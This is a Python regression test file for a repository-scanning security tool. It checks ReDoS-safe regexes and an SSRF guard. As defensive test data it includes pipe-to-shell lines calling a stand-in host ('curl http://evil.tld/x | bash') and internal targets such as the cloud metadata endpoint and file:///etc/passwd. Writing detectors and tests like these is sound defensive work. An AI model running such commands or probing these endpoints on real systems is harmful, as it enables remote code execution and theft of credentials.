"""Regression tests for the CodeQL-flagged hardening fixes.

Covers the two ReDoS regexes (must still match real payloads and must not hang on
pathological input) and the HTTP client SSRF guard.
"""

from __future__ import annotations

import time

import pytest

from git_warden.feeds.http import BlockedURLError, RequestsHttpClient, _guard_url
from git_warden.refs import split_repo_ref
from git_warden.scanning.screening import _REMOTE_EXEC


# --- ReDoS: still correct, and linear on hostile input ------------------------
def test_split_repo_ref_still_parses_real_urls():
    assert split_repo_ref("https://github.com/openai/gym") == ("openai", "gym")
    assert split_repo_ref("git@github.com:torvalds/linux.git") == ("torvalds", "linux")
    assert split_repo_ref("owner/repo") == ("owner", "repo")


def test_split_repo_ref_does_not_hang_on_colon_flood():
    evil = "github.com" + ":" * 40000
    start = time.perf_counter()
    split_repo_ref(evil)  # must return fast, not backtrack
    assert time.perf_counter() - start < 1.0


def test_remote_exec_still_matches_curl_pipe_shell():
    assert _REMOTE_EXEC.search("run: curl http://evil.tld/x | bash")
    assert _REMOTE_EXEC.search("wget https://evil.tld/y|sh")
    assert not _REMOTE_EXEC.search("curl http://example.com/data.json")  # no pipe-to-shell


def test_remote_exec_does_not_hang_on_space_flood():
    evil = "curl" + " " * 60000 + "x"          # spaces, never a pipe
    start = time.perf_counter()
    _REMOTE_EXEC.search(evil)
    assert time.perf_counter() - start < 1.0


# --- SSRF guard ---------------------------------------------------------------
@pytest.mark.parametrize("url", [
    "http://127.0.0.1/x",
    "http://localhost/x",
    "http://169.254.169.254/latest/meta-data/",   # cloud metadata
    "http://10.0.0.5/internal",
    "http://192.168.1.1/router",
    "http://[::1]/x",
    "file:///etc/passwd",
    "ftp://example.com/x",
    "http://0.0.0.0/x",
])
def test_guard_blocks_non_public_or_non_http(url):
    with pytest.raises(BlockedURLError):
        _guard_url(url)


@pytest.mark.parametrize("url", [
    "https://api.github.com/repos/x/y",
    "https://raw.githubusercontent.com/a/b/main/README.md",
    "https://api.opensourcemalware.com/functions/v1/search",
])
def test_guard_allows_public_https(url):
    _guard_url(url)  # must not raise


def test_client_refuses_internal_url_before_requesting(monkeypatch):
    client = RequestsHttpClient()
    # If the guard fails, this sentinel would be hit; it must not be.
    def boom(*a, **k):
        raise AssertionError("request was made to a blocked URL")
    monkeypatch.setattr(client.session, "get", boom)
    with pytest.raises(BlockedURLError):
        client.get_text("http://169.254.169.254/latest/meta-data/")
